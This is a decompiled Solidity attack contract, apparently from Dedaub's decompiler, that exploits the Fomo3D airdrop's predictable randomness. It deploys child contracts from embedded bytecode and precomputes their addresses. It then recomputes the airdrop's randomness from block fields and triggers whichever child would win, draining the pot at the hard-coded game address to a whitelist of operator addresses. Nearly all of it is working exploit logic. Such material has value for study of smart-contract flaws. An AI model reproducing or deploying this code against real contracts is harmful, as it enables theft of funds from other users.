// Decompiled by library.dedaub.com
// 2022.12.08 08:33 UTC

//! ref: https://github.com/yangkun0824/Fomo3d_AirDrop_Attack_Contract/blob/master/Fomo3dAirdropContract.sol

// Data structures and variables inferred from the use of storage instructions
uint256[] _test1; // STORAGE[0x0]
mapping (uint256 => [uint256]) map_1; // STORAGE[0x1]
mapping (uint256 => [uint256]) map_2; // STORAGE[0x2]


function 0x8aa19122(uint256 varg0) public nonPayable { 
    assert(varg0 < _test1.length);
    return address(_test1[varg0]);
}

function 0xa5008247(uint256 varg0) public nonPayable { 
    return map_1[address(varg0)];
}

function 0xfdbb43b4() public nonPayable { 
    return _test1.length;
}

function 0x754() private { 
    if (tx.origin != 0x73b61a56cb93c17a1f5fb21c01cfe0fb23f132c3) {
        if (tx.origin != 0xae587866822dced0c4b5a0b534ec025b52c4acd0) {
            if (tx.origin != 0x16e21b702ea2ee0f4dc40e877099c88acd3d27d5) {
                if (tx.origin != 0x5167350d082c9ec48ed6fd4c694dea7361269705) {
                    require(tx.origin == 0x820d115b9c982260edaa1741812d1f85132736b5);
                }
            }
        }
    }
    return ;
}

function withdraw(uint256 varg0) public nonPayable { 
    0x754();
    require(block.gaslimit < 0x989680);
    if (varg0 > 0) {
        v0 = msg.sender.call().value(varg0).gas(2300 * !varg0);
        require(v0); // checks call status, propagates error data on error
    }
}

function 0x7f1(uint256 varg0, uint256 varg1) private { 
    v0 = v1 = 0 < varg0;
    if (v1) {
        v0 = v2 = varg0 < 128;
    }
    if (!v0) {
        v3 = v4 = 0;
        v5 = v6 = 1;
        while (varg0 >= v5) {
            v3 += 1;
            v5 = v5 << 8;
        }
        v7 = v8 = 1 + v3;
    } else {
        v3 = v9 = 1;
        v7 = v10 = 1;
    }
    v11 = 0x94000000000000000000000000000000000000000000000000000000000000 + (213 + v7 << 248) + (address(varg1) << 80);
    v12 = v13 = 0 < varg0;
    if (v13) {
        v12 = v14 = varg0 < 128;
    }
    if (!v12) {
        v15 = v16 = v11 + (128 + v3 << 72) + varg0 * 256 ** (9 - v3);
    } else {
        v15 = v17 = v11 + (varg0 << 72);
    }
    MEM[64] = v18.data + 32;
    MEM[v18.data] = v15;
    return keccak256(v18.data);
}

function 0x575e7dd6(uint256 varg0) public nonPayable { 
    return address(map_2[address(varg0)]);
}

function () public payable { 
    revert();
}

function execute() public payable { 
    0x754();
    require(block.gaslimit < 0x989680);
    require(0xa62142888aba8370742be823c1782d17a0389da1.code.size);
    v0, v1 = 0xa62142888aba8370742be823c1782d17a0389da1.airDropPot_().gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    require(v1 * 25 / 100 > 0x16345785d8a0000);
    require(0xa62142888aba8370742be823c1782d17a0389da1.code.size);
    v2, v3 = 0xa62142888aba8370742be823c1782d17a0389da1.airDropTracker_().gas(msg.gas);
    require(v2); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    assert(block.timestamp);
    v4 = v5 = 0;
    while (v4 < _test1.length) {
        if (v4 < _test1.length) {
            break;
        }
        assert(v4 < _test1.length);
        if (block.timestamp) {
            break;
        }
        assert(block.timestamp);
        v6 = block.timestamp + block.difficulty + keccak256(address(block.coinbase)) / block.timestamp + block.gaslimit + block.number + keccak256(address(map_2[address(_test1[v4])])) / block.timestamp;
        if (keccak256(v6) - 1000 * (keccak256(v6) / 1000) >= 1 + v3) {
            break;
        }
        if (keccak256(v6) - 1000 * (keccak256(v6) / 1000) < 1 + v3) {
            v7 = address(_test1[v4]);
            map_1[v7] += 1;
            MEM[32] = 1;
            v8 = 0x7f1(1 + map_1[v7], address(_test1[v4]));
            v9 = address(_test1[v4]);
            map_2[v9] = address(v8) | ~0xffffffffffffffffffffffffffffffffffffffff & map_2[v9];
            require(v9.code.size);
            v10 = v9.execute(address(map_2[v7]), keccak256(v6) - 1000 * (keccak256(v6) / 1000)).value(msg.value).gas(msg.gas);
            require(v10); // checks call status, propagates error data on error
            require((address(tx.origin)).balance < (address(tx.origin)).balance);
            return v4;
        }
        v4 = v4 + 1;
    }
    revert();
}

function test1() public payable { 
    assert(0 < _test1.length);
    map_1[address(_test1[0x0])] += 1;
    MEM[32] = 1;
    v0 = 0x7f1(1 + map_1[address(_test1[0x0])], address(_test1[0x0]));
    map_2[address(_test1[0x0])] = address(v0) | ~0xffffffffffffffffffffffffffffffffffffffff & map_2[address(_test1[0x0])];
    require((address(_test1[0x0])).code.size);
    v1 = address(_test1[0x0]).execute(address(map_2[address(_test1[0x0])]), 0).value(msg.value).gas(msg.gas);
    require(v1); // checks call status, propagates error data on error
}

function 0x7a637186(uint256 varg0) public nonPayable { 
    v0 = v1 = 0;
    while (v0 < varg0) {
        MEM[(MEM[64]) len 598] = 0x608060405234801561001057600080fd5b50610236806100206000396000f3006080604052600436106100405763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416633b89bb868114610042575b005b61004073ffffffffffffffffffffffffffffffffffffffff6004351660243561006961017c565b7f60806040526040516020806100f583398101604081815291517f8f38f3090000600052658252600482016020527f81905260016024830152915173a62142888aba8370742be823c1782d17a0389d6040527fa191638f38f309913491604480820192600092909190829003018185885af1936060527f505050505073a62142888aba8370742be823c1782d17a0389da1600160a060026080527f0a0316633ccfd60b6040518163ffffffff167c0100000000000000000000000060a0526f0281526004016000604051808303816060c0527e875af1925050505032600160a060020a0316ff00000000000000000000000060e0526c1c04000000000000000000000061010052610115600034f0505050565b7373b61a56cb93c17a1f5fb21c01cfe0fb23f132c332146102085773ae587866822dced0c4b5a0b534ec025b52c4acd03214610208577316e21b702ea2ee0f4dc40e877099c88acd3d27d5321461020857735167350d082c9ec48ed6fd4c694dea736126970532146102085773820d115b9c982260edaa1741812d1f85132736b5321461020857600080fd5b5600a165627a7a72305820c6345b33da43104e47584c80a863c5662685544a35d2822afe155451785fbc0c0029;
        v2 = create.code(MEM[64], 598).value(0);
        require(v2); // checks call status, propagates error data on error
        _test1.length = _test1.length + 1;
        STORAGE[_test1.length + 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563] = address(v2) | ~0xffffffffffffffffffffffffffffffffffffffff & STORAGE[_test1.length + 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563];
        map_1[address(v2)] = 1;
        v3 = 0x7f1(1, v2);
        map_2[address(v2)] = address(v3) | ~0xffffffffffffffffffffffffffffffffffffffff & map_2[address(v2)];
        v0 += 1;
    }
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length < 4) {
        ();
    } else if (uint32(function_selector >> 224) == 0x2e1a7d4d) {
        withdraw(uint256);
    } else if (0x575e7dd6 == uint32(function_selector >> 224)) {
        0x575e7dd6();
    } else if (0x61461954 == uint32(function_selector >> 224)) {
        execute();
    } else if (0x6b59084d == uint32(function_selector >> 224)) {
        test1();
    } else if (0x7a637186 == uint32(function_selector >> 224)) {
        0x7a637186();
    } else if (0x8aa19122 == uint32(function_selector >> 224)) {
        0x8aa19122();
    } else if (0xa5008247 == uint32(function_selector >> 224)) {
        0xa5008247();
    } else {
        require(0xfdbb43b4 == uint32(function_selector >> 224));
        0xfdbb43b4();
    }
}
